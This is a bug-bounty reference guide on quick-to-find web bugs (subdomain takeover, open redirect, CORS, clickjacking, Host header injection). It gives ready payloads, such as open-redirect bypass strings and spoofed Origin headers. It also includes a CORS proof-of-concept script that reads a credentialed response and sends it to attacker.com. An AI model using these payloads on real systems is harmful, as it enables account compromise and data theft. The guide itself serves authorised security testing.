# Low-Hanging Fruit — Fast, Easy, Still-Paying Bug Classes

These are the bugs beginners find fastest: they need little exploit-dev
skill, are quick to confirm, and many programs still pay for them even at
low/medium severity. Use this file first on a new target, before the
deeper classes in the other reference files — it's the fastest path to a
first paid report. Drawn from disclosed HackerOne reports.

## 1. Subdomain Takeover
**Why it's easy:** pure DNS reconnaissance, no payload crafting, and
almost every large org has at least one forgotten subdomain.

**What it is:** a DNS record (usually CNAME) still points at a third-party
service (Heroku, GitHub Pages, S3, Azure, Fastly, etc.) that the org
stopped using — but never removed the DNS record. If the service allows
new users to claim any unclaimed name, you can claim the org's old
hostname and serve content from it, as the org's own subdomain.

**Exact technique:**
1. Enumerate subdomains: `subfinder -d target.com | httpx` (or `amass`,
   `assetfinder`, crt.sh).
2. For every subdomain, check its CNAME: `dig CNAME sub.target.com`.
3. Flag any CNAME pointing to a third-party domain:
   `*.herokuapp.com`, `*.github.io`, `*.s3.amazonaws.com`,
   `*.azurewebsites.net`, `*.vercel.app`, `*.fastly.net`,
   `*.wpengine.com`, `*.zendesk.com`, `*.unbounce.com`, `*.shopify.com`,
   `*.cargocollective.com`, `*.statuspage.io`, `*.tumblr.com`.
4. Visit the subdomain in a browser — a vulnerable one typically shows a
   service-specific "not found" / "no such app" / "repository not found"
   page (each service has a signature error page — `can-i-take-over-xyz`
   on GitHub maintains a list of these signatures per service).
5. If confirmed, **sign up for that third-party service and claim the
   same name** (e.g. create a Heroku app named exactly what the CNAME
   points to) — this proves the takeover without touching the org's real
   infrastructure. Screenshot the claimed page loading under the org's
   own subdomain as your PoC. Do not host anything beyond a benign proof
   page.
6. Automate the sweep with `subzy` or `nuclei -tags takeover` across the
   full subdomain list from step 1.

## 2. Open Redirect
**Why it's easy:** one parameter, one payload, done. Often chainable into
something bigger (OAuth token theft, phishing-with-legitimacy).

**Disclosed examples and exact payloads:**
| Target | Payload | Technique |
|---|---|---|
| Tumblr logout | `https://www.tumblr.com/logout?redirect_to=https://evil.com%5C%40www.tumblr.com` | Backslash+`@` trick: browsers/parsers can treat `\@` inconsistently, making `evil.com` look like it's part of the trusted host to a naive validator, while actually being the redirect target. |
| GSA (OAuth token theft) | manipulated `redirect_uri` param in an OAuth flow | Open redirect chained into leaking OAuth tokens — the token gets appended to whatever URL `redirect_uri` ends up pointing to, so an open redirect on the OAuth endpoint itself is High/Critical, not just a low-severity redirect. |
| Vend VDP | `//evil.com/` as the redirect value | Protocol-relative URL — looks like a path (`//evil.com`) but browsers treat leading `//` as "same protocol, different host." A common bypass when validation only checks the value doesn't start with `http`. |
| Fuzzing Project | `exit.php?url=` with no validation at all | Simplest case — the param just wasn't checked. Always test any param literally named `url`, `redirect`, `redirect_to`, `return`, `return_to`, `next`, `dest`, `destination`, `r`, `u`, `continue`, `rurl`. |

**Fast test approach:**
1. Grep crawled URLs (`gau`/`katana` output) for any param matching the
   name list above.
2. Try, in order of increasing sophistication:
```
?redirect=https://evil.com
?redirect=//evil.com
?redirect=https:evil.com
?redirect=https://target.com.evil.com
?redirect=https://target.com@evil.com
?redirect=https://target.com%5C@evil.com
?redirect=/\evil.com
?redirect=https://evil.com%2f%2e%2e
```
3. **Always check if it's on an OAuth `redirect_uri`, SSO callback, or
   password-reset link** specifically — that turns "low severity open
   redirect" into "High/Critical — steals tokens/reset links." State this
   distinction clearly in your report; it's the difference in payout.

## 3. CORS Misconfiguration
**Why it's easy:** one header to send, response tells you immediately if
it's vulnerable — no complex payload needed.

**What it is:** the server reflects whatever `Origin` header you send
back into `Access-Control-Allow-Origin`, often combined with
`Access-Control-Allow-Credentials: true` — meaning any website you control
can make the victim's browser send credentialed requests to the target
and read the response.

**Disclosed examples and exact technique:**
- **Zomato** — sent `Origin: developersxzomato.com`, got back
  `Access-Control-Allow-Origin: developersxzomato.com` — the validator
  only checked whether the string `zomato.com` appeared *somewhere* in
  the Origin, not that it was the actual domain.
- **niche.co** — same flaw: check was "does `//niche.co` appear in the
  Origin," bypassed with `Origin: https://niche.co.evil.net` (contains
  the substring, isn't actually that domain).
- **Sifchain / multiple DoD reports** — `Access-Control-Allow-Origin` set
  dynamically to whatever `Origin` was sent, with
  `Access-Control-Allow-Credentials: true` — the single most common CORS
  bug pattern per PortSwigger's own research.

**Fast test approach:**
1. Send a request to every API endpoint with a spoofed `Origin` header:
```
Origin: https://evil.com
Origin: https://target.com.evil.com
Origin: https://evilzztarget.com
Origin: null
```
2. Check the response for `Access-Control-Allow-Origin` reflecting your
   spoofed value (not a fixed allowlisted domain) **and**
   `Access-Control-Allow-Credentials: true` together — either alone is
   much lower impact; both together means a malicious page can read
   authenticated responses.
3. If reflected, build a minimal PoC page:
```html
<script>
fetch('https://target.com/api/sensitive-endpoint', {credentials: 'include'})
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/exfil?data=' + encodeURIComponent(data)));
</script>
```
4. Test `Origin: null` specifically — some validators special-case it
   incorrectly; it's also what sandboxed iframes and some redirect flows
   send.

## 4. Clickjacking
**Why it's easy:** check one response header, done in seconds.

**What it is:** the page can be embedded in an attacker's `<iframe>` and
overlaid with invisible/deceptive UI, tricking users into clicking a
button on the real site (e.g. "delete account," "authorize app") while
thinking they're clicking something else.

**Disclosed examples:**
- GlassWire, Yelp, Localize — simply **missing `X-Frame-Options` entirely**
  on sensitive pages.
- Twitter Periscope (H1 #198622) — **had** `X-Frame-Options: ALLOW-FROM
  https://twitter.com/`, but Chrome never implemented the `ALLOW-FROM`
  directive, so it provided zero actual protection. **Lesson: a header
  being present doesn't mean it's effective — check the directive is one
  browsers actually enforce (`DENY`, `SAMEORIGIN`, or a proper CSP
  `frame-ancestors`).**

**Fast test approach:**
1. Check response headers on every state-changing page (settings,
   account actions, payment, admin actions — not just the homepage):
   `curl -I https://target.com/settings | grep -i "x-frame-options\|content-security-policy"`
2. If missing, or `ALLOW-FROM` is used, or CSP has no `frame-ancestors`
   directive, build a PoC:
```html
<iframe src="https://target.com/settings/delete-account" width="800" height="600"></iframe>
```
3. **Impact only matters on state-changing/sensitive pages** — clickjacking
   on a public marketing page is informational at best; on an
   account-action page it's a real finding. Be honest about this in
   scope — many programs now explicitly exclude clickjacking-on-non-sensitive-pages
   from payout, so check the program's policy first.

## 5. Other fast checks worth a quick pass
- **Host header injection**: send `Host: evil.com` (or add
  `X-Forwarded-Host: evil.com`) to password-reset or email-generating
  endpoints — if the reset link in the email uses the Host header value,
  you can poison password-reset emails to point at your domain.
- **Rate limiting gaps**: test login, OTP, and password-reset endpoints
  with a handful of rapid requests (stay well within reason — this is
  about confirming absence of a limit, not brute-forcing) — missing rate
  limits on OTP/login are a common, quick, Medium-severity find.
- **Verbose error pages / debug mode left on**: trigger a 500 error
  (malformed input, wrong content-type) and check if it leaks a stack
  trace, file paths, or framework debug console (e.g. Django `DEBUG=True`,
  Rails in development mode) — instant Information Disclosure finding,
  zero exploitation needed beyond breaking the request.
- **Default/exposed admin panels**: `ffuf` a target with a wordlist for
  `/admin`, `/wp-admin`, `/phpmyadmin`, `/actuator`, `/console`,
  `/.well-known/` — check for default credentials or missing auth
  entirely on internal-looking tools exposed to the internet.

## Priority order for a time-boxed first session on a new target
1. Subdomain takeover sweep (fully automatable, ~10 min, zero risk)
2. CORS check on every discovered API endpoint (~15 min)
3. Open redirect check on any param matching the name list (~15 min)
4. Clickjacking header check on sensitive pages (~5 min)
5. Then move into the deeper classes: `idor-bola-patterns.md`,
   `ssrf-patterns.md`, `xss-csrf-patterns.md`,
   `sqli-rce-ssti-patterns.md`, `info-disclosure-patterns.md`,
   `auth-jwt-patterns.md`.
